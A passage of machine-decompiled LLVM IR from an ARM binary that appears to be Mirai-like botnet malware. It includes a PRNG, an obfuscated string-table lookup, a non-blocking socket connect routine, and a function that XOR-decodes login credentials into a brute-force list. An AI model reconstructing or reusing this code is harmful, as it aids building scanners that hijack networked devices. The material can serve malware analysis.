  uselistorder i32 ptrtoint (i16** @global_var_25d54.90 to i32), { 0, 1, 3, 2 }
  uselistorder i32 (i32, i32)* @bsd_signal, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_dc20, { 2, 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %dec_label_pc_db68, { 2, 0, 1 }
  uselistorder label %dec_label_pc_db58, { 1, 0 }
  uselistorder label %dec_label_pc_dae4, { 7, 8, 9, 1, 10, 2, 0, 11, 12, 3, 4, 5, 13, 6, 14 }
  uselistorder label %dec_label_pc_d934, { 2, 0, 1 }
}

define i32 @function_dfd8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_dfd8:
  %v0_dfd8 = load i1, i1* @cpsr_c, align 1
  call void @__pseudo_cond_branch(i1 %v0_dfd8, i32 -22312308)
  %v0_dfe0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_dfe0, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_dfd8
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_dfd8, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @rand_next() local_unnamed_addr {
entry:
  %v2_dff0 = load i32, i32* @global_var_2323c.116, align 4
  %v2_dff4 = load i32, i32* @global_var_23248.118, align 4
  %v4_e000 = mul i32 %v2_dff0, 2048
  %v5_e000 = xor i32 %v4_e000, %v2_dff0
  store i32 %v5_e000, i32* @r3, align 4
  %v4_e004 = udiv i32 %v2_dff4, 524288
  %v5_e004 = xor i32 %v4_e004, %v2_dff4
  %v2_e008 = load i32, i32* @global_var_23240.120, align 4
  %v2_e00c = load i32, i32* @global_var_23244.122, align 4
  %v2_e010 = xor i32 %v5_e004, %v5_e000
  %v4_e014 = udiv i32 %v5_e000, 256
  %v5_e014 = xor i32 %v2_e010, %v4_e014
  store i32 %v2_e008, i32* @global_var_2323c.116, align 4
  store i32 %v2_e00c, i32* @global_var_23240.120, align 4
  store i32 %v2_dff4, i32* @global_var_23244.122, align 4
  store i32 %v5_e014, i32* @global_var_23248.118, align 4
  ret i32 %v5_e014

; uselistorder directives
  uselistorder i32 %v2_dff4, { 2, 1, 0 }
  uselistorder i32 %v2_dff0, { 1, 0 }
}

define i32 @rand_init(i32 %arg1) local_unnamed_addr {
entry:
  %v2_e04c = call i32 @__GI_time(i32* null)
  store i32 %v2_e04c, i32* @global_var_2323c.116, align 4
  %v1_e058 = call i32 @__getpid(i32 %v2_e04c)
  store i32 %v1_e058, i32* @r0, align 4
  %v0_e060 = call i32 @getppid()
  %v2_e068 = xor i32 %v1_e058, %v0_e060
  store i32 %v2_e068, i32* @global_var_23240.120, align 4
  %v1_e070 = call i32 @clock(i32 %v2_e068)
  %v2_e074 = load i32, i32* @global_var_23240.120, align 4
  %v2_e080 = xor i32 %v2_e074, %v1_e070
  store i32 %v2_e080, i32* @global_var_23248.118, align 4
  store i32 %v1_e070, i32* @global_var_23244.122, align 4
  ret i32 %v1_e070

; uselistorder directives
  uselistorder i32 %v1_e070, { 1, 2, 0 }
  uselistorder i32 ()* @getppid, { 2, 1, 0 }
  uselistorder i32 (i32)* @__getpid, { 2, 1, 0 }
}

define i32 @rand_alpha_str(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_e0a8 = load i32, i32* @r4, align 4
  %v6_e0a8 = load i32, i32* @r5, align 4
  %v9_e0a8 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v1_e0bc = call i32 @table_unlock_val(i32 28)
  %v3_e0c8 = call i32 @table_retrieve_val(i32 28, i32* null)
  store i32 %v3_e0c8, i32* @r1, align 4
  %v2_e0d4 = bitcast i32* %stack_var_-72 to i8*
  %v3_e0d4 = call i32 @strcpy(i8* %v2_e0d4, i32 %v3_e0c8)
  %v2_e0d8 = icmp eq i32 %arg2, 0
  br i1 %v2_e0d8, label %dec_label_pc_e154, label %dec_label_pc_e0e0

dec_label_pc_e0e0:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_2323c.116 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23240.120 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23244.122 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23248.118 to i32), i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v2_e138 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_e0f4

dec_label_pc_e0f4:                                ; preds = %dec_label_pc_e0f4.dec_label_pc_e0f4_crit_edge, %dec_label_pc_e0e0
  %v1_e118 = phi i32 [ %v1_e118.pre, %dec_label_pc_e0f4.dec_label_pc_e0f4_crit_edge ], [ ptrtoint (i32* @global_var_2323c.116 to i32), %dec_label_pc_e0e0 ]
  %v2_e0f4 = load i32, i32* @global_var_23248.118, align 4
  store i32 %v2_e0f4, i32* %r2.global-to-local, align 4
  %v2_e0f8 = load i32, i32* @global_var_2323c.116, align 4
  %v4_e0fc = udiv i32 %v2_e0f4, 524288
  %v5_e0fc = xor i32 %v4_e0fc, %v2_e0f4
  %v4_e100 = mul i32 %v2_e0f8, 2048
  %v5_e100 = xor i32 %v4_e100, %v2_e0f8
  %v2_e104 = xor i32 %v5_e0fc, %v5_e100
  %v2_e108 = load i32, i32* @global_var_23240.120, align 4
  %v2_e10c = load i32, i32* @global_var_23244.122, align 4
  store i32 %v2_e10c, i32* %ip.global-to-local, align 4
  %v4_e110 = udiv i32 %v5_e100, 256
  %v5_e110 = xor i32 %v2_e104, %v4_e110
  store i32 %v5_e110, i32* @r4, align 4
  %v2_e118 = inttoptr i32 %v1_e118 to i32*
  store i32 %v2_e108, i32* %v2_e118, align 4
  %v0_e11c = load i32, i32* %ip.global-to-local, align 4
  %v1_e11c = load i32, i32* %r8.global-to-local, align 4
  %v2_e11c = inttoptr i32 %v1_e11c to i32*
  store i32 %v0_e11c, i32* %v2_e11c, align 4
  %v0_e120 = load i32, i32* %r2.global-to-local, align 4
  %v1_e120 = load i32, i32* %r7.global-to-local, align 4
  %v2_e120 = inttoptr i32 %v1_e120 to i32*
  store i32 %v0_e120, i32* %v2_e120, align 4
  %v0_e124 = load i32, i32* @r4, align 4
  %v1_e124 = load i32, i32* @r6, align 4
  %v2_e124 = inttoptr i32 %v1_e124 to i32*
  store i32 %v0_e124, i32* %v2_e124, align 4
  %v2_e128 = call i32 @util_strlen(i8* %v2_e0d4)
  %v0_e130 = load i32, i32* @r4, align 4
  %v3_e134 = urem i32 %v0_e130, %v2_e128
  %v2_e13c = add i32 %v3_e134, %v2_e138
  %v1_e140 = add i32 %v2_e13c, -32
  %v2_e140 = inttoptr i32 %v1_e140 to i8*
  %v3_e140 = load i8, i8* %v2_e140, align 1
  %v2_e144 = load i32, i32* @r5, align 4
  %v3_e144 = load i32, i32* %fp.global-to-local, align 4
  %v4_e144 = add i32 %v3_e144, %v2_e144
  %v5_e144 = inttoptr i32 %v4_e144 to i8*
  store i8 %v3_e140, i8* %v5_e144, align 1
  %v0_e148 = load i32, i32* @r5, align 4
  %v1_e148 = add i32 %v0_e148, 1
  store i32 %v1_e148, i32* @r5, align 4
  %v1_e14c = load i32, i32* %sb.global-to-local, align 4
  %v9_e14c = icmp eq i32 %v1_e148, %v1_e14c
  br i1 %v9_e14c, label %dec_label_pc_e154, label %dec_label_pc_e0f4.dec_label_pc_e0f4_crit_edge

dec_label_pc_e0f4.dec_label_pc_e0f4_crit_edge:    ; preds = %dec_label_pc_e0f4
  %v1_e118.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_e0f4

dec_label_pc_e154:                                ; preds = %dec_label_pc_e0f4, %entry
  %v1_e158 = call i32 @table_lock_val(i32 28)
  store i32 %v3_e0a8, i32* @r4, align 4
  store i32 %v6_e0a8, i32* @r5, align 4
  store i32 %v9_e0a8, i32* @r6, align 4
  ret i32 %v1_e158

; uselistorder directives
  uselistorder i32 %v2_e0f8, { 1, 0 }
  uselistorder i32 %v2_e0f4, { 1, 0, 2 }
}

define i32 @rand_str(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_e178 = load i32, i32* %r1.global-to-local, align 4
  %v3_e17c = load i32, i32* @r4, align 4
  store i32 %v3_e17c, i32* %stack_var_-28, align 4
  %v0_e180 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e180, i32* %r5.global-to-local, align 4
  %tmp16 = icmp slt i32 %v0_e178, 1
  br i1 %tmp16, label %dec_label_pc_e228, label %dec_label_pc_e188

dec_label_pc_e188:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_23248.118 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23244.122 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23240.120 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2323c.116 to i32), i32* %r6.global-to-local, align 4
  %v2_e198 = load i32, i32* @global_var_23248.118, align 4
  store i32 %v2_e198, i32* %lr.global-to-local, align 4
  %v2_e19c = load i32, i32* @global_var_23244.122, align 4
  store i32 %v2_e19c, i32* %r4.global-to-local, align 4
  %v2_e1a0 = load i32, i32* @global_var_23240.120, align 4
  store i32 %v2_e1a0, i32* %r0.global-to-local, align 4
  %v2_e1a4 = load i32, i32* @global_var_2323c.116, align 4
  br label %dec_label_pc_e1c8

dec_label_pc_e1ac:                                ; preds = %dec_label_pc_e1e8
  %v1_e1ac = trunc i32 %v5_e1d8 to i16
  %v3_e1ac = inttoptr i32 %v9_e1dc to i16*
  store i16 %v1_e1ac, i16* %v3_e1ac, align 2
  %v4_e1ac = load i32, i32* %r5.global-to-local, align 4
  %v5_e1ac = add i32 %v4_e1ac, -2
  store i32 %v5_e1ac, i32* %r5.global-to-local, align 4
  %v0_e1b0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e1b0

dec_label_pc_e1b0:                                ; preds = %.thread, %dec_label_pc_e1ac
  %v0_e1b0 = phi i32 [ %v9_e1e0, %.thread ], [ %v0_e1b0.pre, %dec_label_pc_e1ac ]
  %v2_e1ac5 = phi i32 [ %v12_e1dc, %.thread ], [ %v5_e1ac, %dec_label_pc_e1ac ]
  %tmp17 = icmp slt i32 %v0_e1b0, 1
  br i1 %tmp17, label %dec_label_pc_e230, label %dec_label_pc_e1bc

dec_label_pc_e1bc:                                ; preds = %dec_label_pc_e1b0
  %v0_e1b4 = load i32, i32* %r0.global-to-local, align 4
  %v0_e1bc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e1bc, i32* %r0.global-to-local, align 4
  %v0_e1c0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v0_e1c0, i32* %r4.global-to-local, align 4
  %v0_e1c4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_e1c4, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_e1c8

dec_label_pc_e1c8:                                ; preds = %dec_label_pc_e188, %dec_label_pc_e1bc
  %v0_e214 = phi i32 [ %v2_e1a0, %dec_label_pc_e188 ], [ %v0_e1bc, %dec_label_pc_e1bc ]
  %v9_e1dc = phi i32 [ %v0_e180, %dec_label_pc_e188 ], [ %v2_e1ac5, %dec_label_pc_e1bc ]
  %v0_e1f4 = phi i32 [ %v0_e178, %dec_label_pc_e188 ], [ %v0_e1b0, %dec_label_pc_e1bc ]
  %v0_e208 = phi i32 [ %v2_e198, %dec_label_pc_e188 ], [ %v0_e1c4, %dec_label_pc_e1bc ]
  %v0_e204 = phi i32 [ %v2_e1a4, %dec_label_pc_e188 ], [ %v0_e1b4, %dec_label_pc_e1bc ]
  %v4_e1c8 = mul i32 %v0_e204, 2048
  %v5_e1c8 = xor i32 %v4_e1c8, %v0_e204
  %v4_e1cc = udiv i32 %v0_e208, 524288
  %v5_e1cc = xor i32 %v4_e1cc, %v0_e208
  %v2_e1d0 = xor i32 %v5_e1cc, %v5_e1c8
  %v4_e1d8 = udiv i32 %v5_e1c8, 256
  %v5_e1d8 = xor i32 %v2_e1d0, %v4_e1d8
  store i32 %v5_e1d8, i32* %r3.global-to-local, align 4
  %v7_e1dc = icmp sgt i32 %v0_e1f4, 3
  br i1 %v7_e1dc, label %.thread, label %dec_label_pc_e1e8

.thread:                                          ; preds = %dec_label_pc_e1c8
  %v10_e1dc = inttoptr i32 %v9_e1dc to i32*
  store i32 %v5_e1d8, i32* %v10_e1dc, align 4
  %v11_e1dc = load i32, i32* %r5.global-to-local, align 4
  %v12_e1dc = add i32 %v11_e1dc, 4
  store i32 %v12_e1dc, i32* %r5.global-to-local, align 4
  %v8_e1e0 = load i32, i32* %r1.global-to-local, align 4
  %v9_e1e0 = add i32 %v8_e1e0, -4
  store i32 %v9_e1e0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e1b0

dec_label_pc_e1e8:                                ; preds = %dec_label_pc_e1c8
  %v7_e1f4 = icmp eq i32 %v0_e1f4, 1
  store i32 %v5_e1d8, i32* %r3.global-to-local, align 4
  %v1_e1fc = add i32 %v0_e1f4, -2
  store i32 %v1_e1fc, i32* %r1.global-to-local, align 4
  br i1 %v7_e1f4, label %dec_label_pc_e204, label %dec_label_pc_e1ac

dec_label_pc_e204:                                ; preds = %dec_label_pc_e1e8
  store i32 %v5_e1d8, i32* %r3.global-to-local, align 4
  %v1_e214 = load i32, i32* %r6.global-to-local, align 4
  %v2_e214 = inttoptr i32 %v1_e214 to i32*
  store i32 %v0_e214, i32* %v2_e214, align 4
  %v0_e218 = load i32, i32* %r4.global-to-local, align 4
  %v1_e218 = load i32, i32* %r7.global-to-local, align 4
  %v2_e218 = inttoptr i32 %v1_e218 to i32*
  store i32 %v0_e218, i32* %v2_e218, align 4
  %v0_e21c = load i32, i32* %lr.global-to-local, align 4
  %v1_e21c = load i32, i32* %r8.global-to-local, align 4
  %v2_e21c = inttoptr i32 %v1_e21c to i32*
  store i32 %v0_e21c, i32* %v2_e21c, align 4
  %v0_e220 = load i32, i32* %r3.global-to-local, align 4
  %v1_e220 = load i32, i32* %sl.global-to-local, align 4
  %v2_e220 = inttoptr i32 %v1_e220 to i32*
  store i32 %v0_e220, i32* %v2_e220, align 4
  %v0_e224 = load i32, i32* %r3.global-to-local, align 4
  %v1_e224 = trunc i32 %v0_e224 to i8
  %v2_e224 = load i32, i32* %r5.global-to-local, align 4
  %v3_e224 = inttoptr i32 %v2_e224 to i8*
  store i8 %v1_e224, i8* %v3_e224, align 1
  br label %dec_label_pc_e228

dec_label_pc_e228:                                ; preds = %entry, %dec_label_pc_e230, %dec_label_pc_e204
  %v2_e228 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_e228, i32* @r4, align 4
  %v1_e22c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_e22c

dec_label_pc_e230:                                ; preds = %dec_label_pc_e1b0
  %v0_e230 = load i32, i32* %r3.global-to-local, align 4
  %v1_e230 = load i32, i32* %sl.global-to-local, align 4
  %v2_e230 = inttoptr i32 %v1_e230 to i32*
  store i32 %v0_e230, i32* %v2_e230, align 4
  %v0_e234 = load i32, i32* %lr.global-to-local, align 4
  %v1_e234 = load i32, i32* %r8.global-to-local, align 4
  %v2_e234 = inttoptr i32 %v1_e234 to i32*
  store i32 %v0_e234, i32* %v2_e234, align 4
  %v0_e238 = load i32, i32* %r4.global-to-local, align 4
  %v1_e238 = load i32, i32* %r7.global-to-local, align 4
  %v2_e238 = inttoptr i32 %v1_e238 to i32*
  store i32 %v0_e238, i32* %v2_e238, align 4
  %v0_e23c = load i32, i32* %r0.global-to-local, align 4
  %v1_e23c = load i32, i32* %r6.global-to-local, align 4
  %v2_e23c = inttoptr i32 %v1_e23c to i32*
  store i32 %v0_e23c, i32* %v2_e23c, align 4
  br label %dec_label_pc_e228

; uselistorder directives
  uselistorder i32 %v9_e1e0, { 1, 0 }
  uselistorder i32 %v12_e1dc, { 1, 0 }
  uselistorder i32 %v5_e1d8, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_e204, { 1, 0 }
  uselistorder i32 %v0_e208, { 1, 0 }
  uselistorder i32 %v0_e1f4, { 1, 0, 2 }
  uselistorder i32 %v0_e1b0, { 1, 0 }
  uselistorder i32 %v0_e178, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 4, 0, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 4, 0, 1, 2, 3, 6, 5 }
  uselistorder i32* %r1.global-to-local, { 3, 5, 4, 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 2, 5, 6, 0, 1 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* @global_var_2323c.116, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_2323c.116 to i32), { 1, 0, 2 }
  uselistorder i32* @global_var_23240.120, { 2, 3, 6, 4, 1, 0, 5 }
  uselistorder i32* @global_var_23244.122, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32* @global_var_23248.118, { 2, 3, 5, 1, 0, 4 }
  uselistorder label %dec_label_pc_e228, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e1c8, { 1, 0 }
}

define i32 @setup_connection() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_e254 = load i32, i32* @r4, align 4
  store i32 %v3_e254, i32* %stack_var_-16, align 4
  %v6_e254 = load i32, i32* @r5, align 4
  %v9_e254 = load i32, i32* @r6, align 4
  %v12_e254 = load i32, i32* @lr, align 4
  %v0_e258 = load i32, i32* @r0, align 4
  store i32 %v0_e258, i32* @r5, align 4
  %v1_e25c = add i32 %v0_e258, 4
  %v2_e25c = inttoptr i32 %v1_e25c to i32*
  %v3_e25c = load i32, i32* %v2_e25c, align 4
  store i32 %v3_e25c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i32 57984, i32* @lr, align 4
  %v1_e27c = icmp ne i32 %v3_e25c, -1
  call void @__pseudo_cond_branch(i1 %v1_e27c, i32 ptrtoint (i32* @global_var_157e0.110 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_e288 = load i32, i32* @r6, align 4
  store i32 %v0_e288, i32* %r2.global-to-local, align 4
  %v3_e28c = call i32 @socket(i32 2, i32 1, i32 %v0_e288)
  store i32 %v3_e28c, i32* %r0.global-to-local, align 4
  %v7_e290 = icmp eq i32 %v3_e28c, -1
  %v1_e294 = load i32, i32* @r5, align 4
  %v2_e294 = add i32 %v1_e294, 4
  %v3_e294 = inttoptr i32 %v2_e294 to i32*
  store i32 %v3_e28c, i32* %v3_e294, align 4
  br i1 %v7_e290, label %entry.dec_label_pc_e30c_crit_edge, label %dec_label_pc_e29c

entry.dec_label_pc_e30c_crit_edge:                ; preds = %entry
  %v1_e314.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e30c

dec_label_pc_e29c:                                ; preds = %entry
  %v2_e260 = ptrtoint i32* %stack_var_-32 to i32
  %v0_e29c = load i32, i32* @r5, align 4
  %v1_e29c = add i32 %v0_e29c, 28
  store i32 %v1_e29c, i32* @r0, align 4
  %v0_e2a0 = load i32, i32* @r6, align 4
  %v2_e2a0 = add i32 %v0_e29c, 24
  %v3_e2a0 = inttoptr i32 %v2_e2a0 to i32*
  store i32 %v0_e2a0, i32* %v3_e2a0, align 4
  store i32 256, i32* @r1, align 4
  %v0_e2a8 = call i32 @util_zero()
  store i32 %v0_e2a8, i32* %r0.global-to-local, align 4
  %v0_e2ac = load i32, i32* @r5, align 4
  %v1_e2ac = add i32 %v0_e2ac, 4
  %v2_e2ac = inttoptr i32 %v1_e2ac to i32*
  %v3_e2ac = load i32, i32* %v2_e2ac, align 4
  store i32 %v3_e2ac, i32* @r4, align 4
  %v0_e2b0 = load i32, i32* @r6, align 4
  store i32 %v0_e2b0, i32* @r2, align 4
  store i32 %v3_e2ac, i32* %r0.global-to-local, align 4
  %v2_e2bc = call i32 @__libc_fcntl(i32 %v3_e2ac, i32 3)
  %v1_e2c4 = or i32 %v2_e2bc, 2048
  store i32 %v1_e2c4, i32* @r2, align 4
  %v0_e2c8 = load i32, i32* @r4, align 4
  store i32 %v0_e2c8, i32* %r0.global-to-local, align 4
  %v2_e2cc = call i32 @__libc_fcntl(i32 %v0_e2c8, i32 4)
  store i32 %v2_e2cc, i32* %r0.global-to-local, align 4
  %v2_e2d4 = load i32, i32* @global_var_23280.136, align 4
  store i32 %v2_e2d4, i32* %r2.global-to-local, align 4
  %v1_e2dc = load i32, i32* @r5, align 4
  %v2_e2dc = add i32 %v1_e2dc, 12
  %v3_e2dc = inttoptr i32 %v2_e2dc to i32*
  store i32 1, i32* %v3_e2dc, align 4
  store i32 2, i32* %stack_var_-32, align 4
  %v0_e2e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_e2e8 = load i32, i32* @r5, align 4
  %v2_e2e8 = add i32 %v1_e2e8, 8
  %v3_e2e8 = inttoptr i32 %v2_e2e8 to i32*
  store i32 %v0_e2e8, i32* %v3_e2e8, align 4
  %v0_e2ec = load i32, i32* @r5, align 4
  %v1_e2f0 = add i32 %v0_e2ec, 4
  %v2_e2f0 = inttoptr i32 %v1_e2f0 to i32*
  %v3_e2f0 = load i32, i32* %v2_e2f0, align 4
  store i32 %v3_e2f0, i32* %r0.global-to-local, align 4
  %v1_e2f4 = add i32 %v0_e2ec, 20
  %v2_e2f4 = inttoptr i32 %v1_e2f4 to i16*
  %v3_e2f4 = load i16, i16* %v2_e2f4, align 2
  %v4_e2f4 = zext i16 %v3_e2f4 to i32
  store i32 %v4_e2f4, i32* @r5, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_e308 = call i32 @__libc_connect(i32 %v3_e2f0, i32 %v2_e260, i32 16)
  store i32 %v3_e308, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e30c

dec_label_pc_e30c:                                ; preds = %entry.dec_label_pc_e30c_crit_edge, %dec_label_pc_e29c
  %v1_e314 = phi i32 [ %v1_e314.pre, %entry.dec_label_pc_e30c_crit_edge ], [ %v3_e308, %dec_label_pc_e29c ]
  %v2_e310 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_e310, i32* @r4, align 4
  store i32 %v6_e254, i32* @r5, align 4
  store i32 %v9_e254, i32* @r6, align 4
  store i32 %v12_e254, i32* @lr, align 4
  ret i32 %v1_e314

; uselistorder directives
  uselistorder i32 %v3_e28c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 3, 2, 4, 5, 8, 9, 7, 6 }
  uselistorder i32 ()* @util_zero, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_e30c, { 1, 0 }
}

define i32 @add_auth_entry(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_e31c = load i32, i32* @r4, align 4
  %v6_e31c = load i32, i32* @r5, align 4
  %v9_e31c = load i32, i32* @r6, align 4
  %v12_e31c = load i32, i32* @r7, align 4
  %v15_e31c = load i32, i32* @r8, align 4
  %v18_e31c = load i32, i32* @sb, align 4
  %v21_e31c = load i32, i32* @sl, align 4
  %v24_e31c = load i32, i32* @fp, align 4
  store i32 ptrtoint (i32* @global_var_2324c.138 to i32), i32* @fp, align 4
  %v2_e324 = load i32, i32* @global_var_2324c.138, align 4
  store i32 ptrtoint (i32* @global_var_23278.140 to i32), i32* @sl, align 4
  %v1_e330 = add i32 %v2_e324, 1
  store i32 %v1_e330, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_e33c = load i32, i32* @global_var_23278.140, align 4
  store i32 %v2_e33c, i32* %r0.global-to-local, align 4
  %v3_e340 = mul i32 %v1_e330, 16
  store i32 %v3_e340, i32* %r1.global-to-local, align 4
  %v4_e348 = inttoptr i32 %v2_e33c to i32*
  %v5_e348 = call i32 @realloc(i32* %v4_e348, i32 %v3_e340, i32 %arg3, i32 %v1_e330)
  %v2_e34c = load i32, i32* @global_var_2324c.138, align 4
  store i32 %v2_e34c, i32* %r2.global-to-local, align 4
  store i32 %v5_e348, i32* @r8, align 4
  %v0_e354 = load i32, i32* @r5, align 4
  store i32 %v0_e354, i32* %r0.global-to-local, align 4
  %v1_e35c = load i32, i32* @sl, align 4
  %v2_e35c = inttoptr i32 %v1_e35c to i32*
  store i32 %v5_e348, i32* %v2_e35c, align 4
  %v1_e360 = inttoptr i32 %v0_e354 to i8*
  %v2_e360 = call i32 @util_strlen(i8* %v1_e360)
  %sext = mul i32 %v2_e360, 16777216
  %v1_e364 = sdiv i32 %sext, 16777216
  %v2_e364 = add nsw i32 %v1_e364, 1
  store i32 %v2_e364, i32* @r4, align 4
  store i32 %v1_e364, i32* @r7, align 4
  store i32 %v2_e364, i32* @r0, align 4
  %v0_e370 = call i32 @malloc()
  store i32 %v0_e370, i32* %r0.global-to-local, align 4
  %v0_e374 = load i32, i32* @r5, align 4
  store i32 %v0_e374, i32* %r1.global-to-local, align 4
  %v0_e378 = load i32, i32* @r4, align 4
  store i32 %v0_e378, i32* %r2.global-to-local, align 4
  store i32 %v0_e370, i32* %r6.global-to-local, align 4
  %v3_e380 = call i32 @util_memcpy(i32 %v0_e370, i32 %v0_e374, i32 %v0_e378)
  store i32 %v3_e380, i32* %r0.global-to-local, align 4
  %v0_e384 = load i32, i32* @r7, align 4
  %tmp22 = icmp slt i32 %v0_e384, 1
  %extract.t6 = trunc i32 %v0_e384 to i8
  br i1 %tmp22, label %dec_label_pc_e3a8, label %dec_label_pc_e38c

dec_label_pc_e38c:                                ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e390

dec_label_pc_e390:                                ; preds = %dec_label_pc_e390, %dec_label_pc_e38c
  %v2_e398 = phi i32 [ %v1_e39c, %dec_label_pc_e390 ], [ 0, %dec_label_pc_e38c ]
  %v1_e390 = load i32, i32* %r6.global-to-local, align 4
  %v2_e390 = add i32 %v1_e390, %v2_e398
  %v3_e390 = inttoptr i32 %v2_e390 to i8*
  %v4_e390 = load i8, i8* %v3_e390, align 1
  %v6_e390 = zext i8 %v4_e390 to i32
  %v1_e394 = xor i32 %v6_e390, 84
  store i32 %v1_e394, i32* %r3.global-to-local, align 4
  %v1_e398 = trunc i32 %v1_e394 to i8
  store i8 %v1_e398, i8* %v3_e390, align 1
  %v0_e39c = load i32, i32* %r2.global-to-local, align 4
  %v1_e39c = add i32 %v0_e39c, 1
  store i32 %v1_e39c, i32* %r2.global-to-local, align 4
  %v1_e3a0 = load i32, i32* @r7, align 4
  %v9_e3a0 = icmp eq i32 %v1_e39c, %v1_e3a0
  br i1 %v9_e3a0, label %dec_label_pc_e3a8.loopexit, label %dec_label_pc_e390

dec_label_pc_e3a8.loopexit:                       ; preds = %dec_label_pc_e390
  %extract.t = trunc i32 %v1_e39c to i8
  br label %dec_label_pc_e3a8

dec_label_pc_e3a8:                                ; preds = %dec_label_pc_e3a8.loopexit, %entry
  %v0_e3b8.off0 = phi i8 [ %extract.t, %dec_label_pc_e3a8.loopexit ], [ %extract.t6, %entry ]
  %v2_e3a8 = load i32, i32* @global_var_2324c.138, align 4
  %v2_e3ac = load i32, i32* @global_var_23278.140, align 4
  %v3_e3b0 = mul i32 %v2_e3a8, 16
  store i32 %v3_e3b0, i32* @sb, align 4
  %v2_e3b4 = add i32 %v2_e3ac, %v3_e3b0
  store i32 %v2_e3b4, i32* %r2.global-to-local, align 4
  %v3_e3b8 = add i32 %v2_e3b4, 12
  %v4_e3b8 = inttoptr i32 %v3_e3b8 to i8*
  store i8 %v0_e3b8.off0, i8* %v4_e3b8, align 1
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v2_e34c, i32* %r3.global-to-local, align 4
